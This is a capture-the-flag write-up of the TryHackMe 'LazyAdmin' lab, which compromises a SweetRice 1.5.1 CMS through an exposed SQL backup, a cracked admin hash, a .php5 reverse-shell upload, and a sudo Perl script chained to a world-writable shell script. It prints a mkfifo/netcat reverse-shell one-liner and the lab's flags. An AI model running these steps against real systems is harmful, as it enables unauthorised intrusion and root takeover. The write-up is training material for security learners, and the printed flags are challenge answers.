---
title: "LazyAdmin"
slug: "lazyadmin"
category: "web-application"
description: "Exploit a misconfigured web application to gain access to the target, escalate privileges, and capture the flags."
date: "2025-05-15"
---

# Challenge Setup

## Tools Used:

- **Nmap** — Port scanning and service enumeration
- **Gobuster** — Directory brute-forcing to discover hidden paths
- **CrackStation** — Online MD5 hash cracking
- **Netcat** — Reverse shell listener

## Environment:

- TryHackMe hosted VM — Accessed via the provided IP address
- Kali Linux (attacker machine)

# Initial Recon

I deployed the machine and ran an Nmap scan:

```
nmap -sC -sV <target-ip>
```

Two ports were open:

- Port 22/tcp — OpenSSH
- Port 80/tcp — Apache HTTP

Visiting the site in a browser showed the default Apache welcome page. I ran Gobuster to enumerate directories:

```
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

This returned a `/content` directory. Navigating to it revealed a **SweetRice CMS** installation page.

# Exploitation / Solution

## Step One — Enumerating SweetRice

I ran Gobuster again, this time targeting `/content`:

```
gobuster dir -u http://<target-ip>/content -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

This returned several subdirectories. The most useful were:

- `/content/inc` — contained a `lastest.txt` file confirming the CMS version as **1.5.1**, and a `mysql_backup` folder
- `/content/as` — the SweetRice admin login panel

## Step Two — Finding Credentials

Inside `/content/inc/mysql_backup/` was a SQL backup file. I downloaded it:

```
wget http://<target-ip>/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
```

Inspecting the file revealed a database `INSERT` statement containing the admin credentials:

- **Username:** `manager`
- **Password hash:** `42f749ade7f9e195bf475f37a44cafcb` (MD5)

I submitted the hash to CrackStation, which cracked it instantly:

**Password:** `Password123`

This is a known exploit for SweetRice 1.5.1 — Backup Disclosure (EDB-ID-40718) — which allows unauthenticated access to the MySQL backup file containing credentials.

## Step Three — Admin Dashboard Access

I navigated to the admin login panel at `/content/as/` and logged in with `manager:Password123`. This granted full access to the SweetRice CMS backend.

## Step Four — Gaining a Shell

Inside the dashboard, the **Media Center** had a file upload function. Direct `.php` uploads were blocked, but the CMS accepted alternative PHP extensions. I uploaded a PHP reverse shell saved as `shell.php5`:

```
# Shell uploaded to: http://<target-ip>/content/attachment/shell.php5
```

I started a Netcat listener on my machine:

```
nc -lvnp 4444
```

Then triggered the shell by visiting the uploaded file's URL in the browser. A reverse shell connected back as `www-data`.

I navigated to `/home/itguy` and retrieved the user flag from `user.txt`.

## Step Five — Privilege Escalation

I checked what commands `www-data` could run as root:

```
sudo -l
```

The output showed:

```
(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

Reading `backup.pl` revealed it simply calls another script:

```perl
system("sh", "/etc/copy.sh");
```

Checking `/etc/copy.sh` showed it was a reverse shell script — and critically, it was **world-writable**. I overwrote it with a new reverse shell payload pointing to my machine:

```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker-ip> 5555 >/tmp/f' > /etc/copy.sh
```

I started a new Netcat listener on port 5555, then triggered the chain:

```
sudo /usr/bin/perl /home/itguy/backup.pl
```

`backup.pl` ran as root, called `/etc/copy.sh`, and my listener caught a root shell. I retrieved the root flag from `/root/root.txt`.

# Flags

```
User Flag: THM{63e5bce9271952aad1113b6f1ac28a07}
Root Flag: THM{6637f41d0177b6f37cb20d775124699f}
```

# Tools Used

- **Nmap** — Port scanning and service detection
- **Gobuster** — Directory brute-forcing
- **CrackStation** — MD5 hash cracking
- **Netcat** — Reverse shell listener

# Notes / Lessons Learned

- Always check for CMS version numbers — a specific version often maps directly to known CVEs. SweetRice 1.5.1 has several public exploits including backup disclosure, arbitrary file upload, and CSRF.
- MySQL backup files in a web-accessible directory are a critical misconfiguration — they can expose plaintext or weakly-hashed credentials.
- File upload filters based on extension alone are easily bypassed with alternative extensions like `.php5` or `.phtml`, which PHP will still execute.
- The full privesc chain here required three steps to understand: (1) `sudo -l` reveals a Perl script runnable as root, (2) that script calls a shell script, (3) that shell script is world-writable. Each individual step looks minor; together they give root. Always trace the full call chain.

<img src="https://raw.githubusercontent.com/KieranPritchard/CTF-Write-Ups/main/TryHackMe/Lazy_Admin/Lazy_Admin_Screenshot_1.png" alt="Screenshot 1">
<img src="https://raw.githubusercontent.com/KieranPritchard/CTF-Write-Ups/main/TryHackMe/Lazy_Admin/Lazy_Admin_Screenshot_2.png" alt="Screenshot 2">
<img src="https://raw.githubusercontent.com/KieranPritchard/CTF-Write-Ups/main/TryHackMe/Lazy_Admin/Lazy_Admin_Screenshot_3.png" alt="Screenshot 3">
<img src="https://raw.githubusercontent.com/KieranPritchard/CTF-Write-Ups/main/TryHackMe/Lazy_Admin/Lazy_Admin_Screenshot_4.png" alt="Screenshot 4">
<img src="https://raw.githubusercontent.com/KieranPritchard/CTF-Write-Ups/main/TryHackMe/Lazy_Admin/Lazy_Admin_Screenshot_5.png" alt="Screenshot 5">
<img src="https://raw.githubusercontent.com/KieranPritchard/CTF-Write-Ups/main/TryHackMe/Lazy_Admin/Lazy_Admin_Screenshot_6.png" alt="Screenshot 6">
<img src="https://raw.githubusercontent.com/KieranPritchard/CTF-Write-Ups/main/TryHackMe/Lazy_Admin/Lazy_Admin_Screenshot_7.png" alt="Screenshot 7">
<img src="https://raw.githubusercontent.com/KieranPritchard/CTF-Write-Ups/main/TryHackMe/Lazy_Admin/Lazy_Admin_Screenshot_8.png" alt="Screenshot 8">
<img src="https://raw.githubusercontent.com/KieranPritchard/CTF-Write-Ups/main/TryHackMe/Lazy_Admin/Lazy_Admin_Screenshot_9.png" alt="Screenshot 9">
<img src="https://raw.githubusercontent.com/KieranPritchard/CTF-Write-Ups/main/TryHackMe/Lazy_Admin/Lazy_Admin_Screenshot_10.png" alt="Screenshot 10">
<img src="https://raw.githubusercontent.com/KieranPritchard/CTF-Write-Ups/main/TryHackMe/Lazy_Admin/Lazy_Admin_Screenshot_11.png" alt="Screenshot 11">
<img src="https://raw.githubusercontent.com/KieranPritchard/CTF-Write-Ups/main/TryHackMe/Lazy_Admin/Lazy_Admin_Screenshot_12.png" alt="Screenshot 12">
<img src="https://raw.githubusercontent.com/KieranPritchard/CTF-Write-Ups/main/TryHackMe/Lazy_Admin/Lazy_Admin_Screenshot_13.png" alt="Screenshot 13">
<img src="https://raw.githubusercontent.com/KieranPritchard/CTF-Write-Ups/main/TryHackMe/Lazy_Admin/Lazy_Admin_Screenshot_14.png" alt="Screenshot 14">
<img src="https://raw.githubusercontent.com/KieranPritchard/CTF-Write-Ups/main/TryHackMe/Lazy_Admin/Lazy_Admin_Screenshot_15.png" alt="Screenshot 15">
<img src="https://raw.githubusercontent.com/KieranPritchard/CTF-Write-Ups/main/TryHackMe/Lazy_Admin/Lazy_Admin_Screenshot_16.png" alt="Screenshot 16">
<img src="https://raw.githubusercontent.com/KieranPritchard/CTF-Write-Ups/main/TryHackMe/Lazy_Admin/Lazy_Admin_Screenshot_17.png" alt="Screenshot 17">
<img src="https://raw.githubusercontent.com/KieranPritchard/CTF-Write-Ups/main/TryHackMe/Lazy_Admin/Lazy_Admin_Screenshot_18.png" alt="Screenshot 18">
<img src="https://raw.githubusercontent.com/KieranPritchard/CTF-Write-Ups/main/TryHackMe/Lazy_Admin/Lazy_Admin_Screenshot_19.png" alt="Screenshot 19">
<img src="https://raw.githubusercontent.com/KieranPritchard/CTF-Write-Ups/main/TryHackMe/Lazy_Admin/Lazy_Admin_Screenshot_20.png" alt="Screenshot 20">
<img src="https://raw.githubusercontent.com/KieranPritchard/CTF-Write-Ups/main/TryHackMe/Lazy_Admin/Lazy_Admin_Screenshot_21.png" alt="Screenshot 21">
<img src="https://raw.githubusercontent.com/KieranPritchard/CTF-Write-Ups/main/TryHackMe/Lazy_Admin/Lazy_Admin_Screenshot_22.png" alt="Screenshot 22">